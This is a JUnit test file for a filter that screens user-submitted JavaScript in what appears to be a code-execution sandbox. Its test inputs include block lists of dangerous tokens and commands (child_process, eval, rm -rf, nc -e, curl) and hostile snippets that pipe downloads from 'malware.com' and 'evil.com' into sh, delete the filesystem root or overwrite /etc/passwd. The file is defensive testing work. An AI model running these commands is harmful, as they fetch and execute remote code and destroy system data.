package devdojo.compiler.javascript.security;


import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import devdojo.compiler.security.ISecurityFilter;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

final class JavaScriptInputFilterTests {

  private ISecurityFilter filter;

  @BeforeEach
  void setUp() {
    filter = new ForbiddenJavaScriptInputFilter();
  }

  @Test
  @DisplayName("returns false when input is null")
  void testNullInput() {
    boolean result = filter.check(null);
    assertFalse(result, "Null input should be rejected");
  }

  @Test
  @DisplayName("returns false when input is empty or blank")
  void testEmptyInput() {
    boolean result = filter.check("   ");
    assertFalse(result, "Blank input should be rejected");
  }

  @Test
  @DisplayName("returns true for safe JavaScript code")
  void testValidJavaScriptCode() {
    String safeCode = """
      // simple math function
      function add(a, b) {
        return a + b;
      }
      add(2, 3);
      """;

    assertTrue(filter.check(safeCode), "Safe JS code should pass");
  }

  @ParameterizedTest
  @ValueSource(strings = {
    "import", "require(", "module.exports", "exports.", "eval(", "new Function(", "Function(",
    "process", "process.env", "process.exit", "process.kill", "process.binding",
    "child_process", ".spawn(", ".exec(", ".execSync(", ".spawnSync(", ".fork(",
    "fs", "fs.readFile", "fs.writeFile", "fs.unlink", "vm.runInThisContext",
    "vm.runInNewContext", "Buffer", "globalThis", "__proto__", ".constructor",
    "while(true)", "for(;;)", "window", "document", "XMLHttpRequest"
  })
  @DisplayName("detects forbidden JavaScript keywords and tokens")
  void testForbiddenJavaScriptKeyword(final String keyword) {
    assertFalse(filter.check(keyword), "Forbidden JavaScript keyword/token should be detected: " + keyword);
  }

  @ParameterizedTest
  @ValueSource(strings = {
    ".js", ".json", ".sh", ".bat", ".exe", ".dll", ".zip",
    "/etc", "/home", "C:\\", "C:\\Windows\\System32", "%TEMP%"
  })
  @DisplayName("detect forbidden file endings or paths")
  void testForbiddenFileEnding(final String fileEnding) {
    assertFalse(filter.check(fileEnding), "Forbidden file endings or paths should be detected: " + fileEnding);
  }

  @ParameterizedTest
  @ValueSource(strings = {
    "rm -rf", "curl", "wget", "chmod", "chown", "nc -l", "nc -e", "bash -c",
    "node -e", "python -c", "../", "..", "\\\\", "\\u0070rocess" // unicode-escaped 'p' in 'process'
  })
  @DisplayName("detects forbidden commands or obfuscation patterns")
  void testForbiddenCommand(final String command) {
    assertFalse(filter.check(command), "Forbidden command or obfuscation pattern should be detected: " + command);
  }

  @Test
  @DisplayName("detects forbidden function / dangerous code snippets")
  void testForbiddenFunctionCode() {
    final String dangerous1 = """
      const { exec } = require('child_process');
      exec('curl http://malware.com | sh');
      """;

    final String dangerous2 = """
      const fs = require('fs');
      fs.writeFile('/etc/passwd', 'pwned');
      """;

    final String dangerous3 = """
      // dynamic code creation
      const evil = new Function("require('child_process').exec('rm -rf /')");
      evil();
      """;

    final String dangerous4 = """
      // vm usage
      const vm = require('vm');
      vm.runInThisContext("while(true){}");
      """;

    assertFalse(filter.check(dangerous1), "Forbidden child_process exec should be blocked");
    assertFalse(filter.check(dangerous2), "Forbidden fs write should be blocked");
    assertFalse(filter.check(dangerous3), "Forbidden Function constructor should be blocked");
    assertFalse(filter.check(dangerous4), "Forbidden vm usage should be blocked");
  }

  @Test
  @DisplayName("detects multiple forbidden inputs in one script")
  void testMultipleForbiddenInputs() {
    final String code = """
        const fs = require('fs');
        const cp = require('child_process');
        cp.execSync('curl evil.com | sh');
        fs.writeFileSync('/tmp/out','pwn');
      """;

    assertFalse(filter.check(code), "Multiple forbidden items should cause rejection");
  }

}
